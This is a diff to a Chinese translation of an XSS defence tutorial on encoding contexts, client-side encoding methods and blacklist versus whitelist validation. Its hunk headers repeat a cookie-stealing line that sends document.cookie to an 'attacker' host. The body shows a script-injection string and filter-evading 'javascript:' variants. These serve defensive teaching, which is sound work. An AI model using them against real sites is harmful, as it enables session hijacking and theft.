@@ -209,23 +209,23 @@ window.location='http://attacker/?cookie='+document.cookie
 	<tbody>
 		<tr>
 			<td>HTML element content</td>
-			<td>&#60;div&#62;userInput&#60;&#47;div&#62;</td>
+			<td>&#60;div&#62;<strong>userInput</strong>&#60;&#47;div&#62;</td>
 		</tr>
 		<tr>
 			<td>HTML attribute value</td>
-			<td>&#60;input value="userInput"&#62;</td>
+			<td>&#60;input value="<strong>userInput</strong>"&#62;</td>
 		</tr>	
 		<tr>
 			<td>URL query value</td>
-			<td>http://example.com/?parameter=userInput</td>
+			<td>http://example.com/?parameter=<strong>userInput</strong></td>
 		</tr>
 		<tr>
 			<td>CSS value</td>
-			<td>color: userInput</td>
+			<td>color: <strong>userInput</strong></td>
 		</tr>
 		<tr>
 			<td>JavaScript value</td>
-			<td>var name = "userInput";</td>
+			<td>var name = "<strong>userInput</strong>";</td>
 		</tr>								
 	</tbody>
 </table>
@@ -239,15 +239,15 @@ window.location='http://attacker/?cookie='+document.cookie
 <table>
 	<tr>
 		<td>Application code</td>
-		<td>&#60;input value="userInput"&#62;</td>
+		<td>&#60;input value="<strong>userInput</strong>"&#62;</td>
 	</tr>
 	<tr>
 		<td>Malicious string</td>
-		<td>"&#62;&#60;script&#62;...&#60;&#47;script&#62;&#60;input value="</td>
+		<td style="color:hsl(0, 100%, 50%)">"&#62;&#60;script&#62;...&#60;&#47;script&#62;&#60;input value="</td>
 	</tr>
 	<tr>
 		<td>Resulting code</td>
-		<td>&#60;input value=""&#62;&#60;script&#62;...&#60;&#47;script&#62;&#60;input value=""&#62;</td>
+		<td>&#60;input value="<strong style="color:hsl(0, 100%, 50%)">"&#62;&#60;script&#62;...&#60;&#47;script&#62;&#60;input value="</strong>"&#62;</td>
 	</tr>		
 </table>
 
@@ -273,7 +273,7 @@ window.location='http://attacker/?cookie='+document.cookie
 
 ### 编码
 
-编码是一种将用户输入转义的行为，以确保浏览器把输入当作数据而不是代码对待。在web开发中辨别度最高莫过于HTML转义，该方法将`<`和`>`分别转义为`&lt;`和`&gt;`。
+编码是一种将用户输入转义的行为，以确保浏览器把输入当作数据而不是代码对待。在web开发中最知名的一类编码莫过于HTML转义，该方法将`<`和`>`分别转义为`&lt;`和`&gt;`。
 
 下面的伪代码是一段使用HTML转义将用户输入编码的服务器脚本示例：
 
@@ -300,6 +300,82 @@ Latest comment:
 
 当在服务端实现编码时，你依赖你服务端的编程语言或者框架自带的方法。鉴于有非常多的语言和框架可用，这篇教程不会涵盖与任何具体语言或者框架相关的编码细节，但是了解客户端Javascript编码函数的使用对编写服务端代码也是非常有帮助的。
 
-##### 客户端编码
+##### 在客户端进行编码
 
+当在客户端利用Javascript对用户输入进行编码时，有一些内置的方法和属性能够在自动感知上下文的情况下自动对所有的数据进行编码：
 
+<table>
+	<thead>
+		<th>Context</th>
+		<th>Method/property</th>
+	</thead>
+	<tbody>
+		<tr>
+			<td>HTML element content</td>
+			<td>node.textContent = <strong>userInput</strong></td>
+		</tr>
+		<tr>
+			<td>HTML attribute value</td>
+			<td><em>element</em>.setAttribute(<em>attribute</em>, <strong>userInput</strong>)<br>or<br><em>element</em>[attribute] = <strong>userInput</strong></td>
+		</tr>
+		<tr>
+			<td>URL query value</td>
+			<td>window.encodeURIComponent(<strong>userInput</strong>)</td>
+		</tr>
+		<tr>
+			<td>CSS value</td>
+			<td><em>element</em>.style.<em>property</em>= <strong>userInput</strong></td>
+		</tr>				
+	</tbody>
+</table>
+
+之前提到的最后一类上下文（Javascript值）并不在这个列表之中，因为Javascript源码中并不提供内置的数据编码方法。
+
+#### 编码的局限性
+
+即使有编码的辅助，恶意文本仍然可能插入进一些上下文中。一个著名的例子就是用户通过输入来提供URL时，比如下面这个例子：
+
+```
+document.querySelector('a').href = **userInput**
+```
+虽然给一个锚点元素的`href`属性赋值时该值会被自动的编码，最终也不过是一个属性值而已，但这并不能阻止攻击者以`javascript:`开头插入一段URL。当该链接被点击后，URL中的任何脚本都会被执行。
+
+在你真心希望用户可以自定义页面的代码的情况下，对输入进行编码也不是一个好的解决方案。一个典型的例子就是当用户可以使用HTML自定义个人主页时。如果自定义的HTML全都被编码了，那么个人主页只剩下一堆纯文本而已。
+
+在这些情况中，校验措施就被补充进来，也就是我们接下来要描述的内容。
+
+### 校验
+
+校验是一种过滤用户输入以至于让代码中仅存恶意部分被移除的行为。在web开发中最知名的校验是允许HTML元素（比如`<em>`和`<strong>`）的存在而拒绝其他内容（比如`<script>`）。
+
+不同的校验实现主要有两点特征上的区别：
+
+- **分类策略**：用户输入既可以用黑名单过滤也可以用白名单过滤
+- **校验结果**：被认定为恶意的用户输入可以既可以被拒绝使用也可以在规范化之后继续使用
+
+#### 分类策略
+
+##### 黑名单制
+
+我们会自然的认为，通过建立一套禁止用户做出某些输入的模式，来实现校验是非常合理的。如果文本匹配中这个模式，则被认定为无效。其中一个例子就是允许用户提交除`javascript:`以外任何协议的自定义URL。这样的分类策略被称为*黑名单*。
+
+但是黑名单有两个主要的缺陷：
+
+- **复杂性**：准确的描述出所有恶意文本的集合通常是一件非常复杂的任务。上面例子中描述的策略，仅仅通过搜索子字符串"javascript"是不可能成功的，因为这样会导致错过`Javascript:`（首字母大写）和`&#106;avascript:`（首字母被编码为字符值引用）形式的字符串。
+- **过时**：即使一个完美的黑名单被制作出来，但如果一个新的浏览器特性允许被恶意的使用，这样的校验仍然会失败。举个例子，一个在HTML5的`onmousewheel`特性引入之前制作出的黑名单，组织不了攻击者使用那个属性进行一次XSS攻击。这个缺陷在web开发中显得尤其重要，因为开发中的许多技术都是在不断更新中的。
+
+因为这些缺陷，分类策略中的黑名单制并不鼓励使用。白名单制通常要安全许多，我们接下来继续讲解。
+
+##### 白名单制
+
+白名单机制与黑名单相反：与定义一个禁止输入哪些的模式不同，白名单方式定义了一个允许输入哪些的模式，并且如果用户输入与该模式不匹配则该输入视为无效。
+
+与之前黑名单的例子相反，一个白名单的例子会是只允许用户提交包含`http:`与`https:`协议的自定义URL。这种方式会将包含`javascript`协议的URL视为无效，甚至出现`Javascript`或者`&#106;avascript:`也被视为无效。
+
+和黑名单相比，白名单有两点主要的好处：
+
+- **简单**：准确的列举出一组安全文本总的来说会比辨别出一组恶意文本来的简单。尤其是用户输入只有限的涵盖浏览器功能子集的大多数情况下。举个例子，上面描述的只允许以`http:`或者`https:`协议开头的URL的白名单就非常的简单，并且完美适配大多数的用户场景。
+
+- **长效**：与黑名单不同，当浏览器加入新的特性时白名单的内容也不会变得过时。比如当HTML5的`onmousewheel`属性被引入时，只允许HTML元素上存在`title`属性的白名单校验规则仍然有效。
+
+#### 校验输出
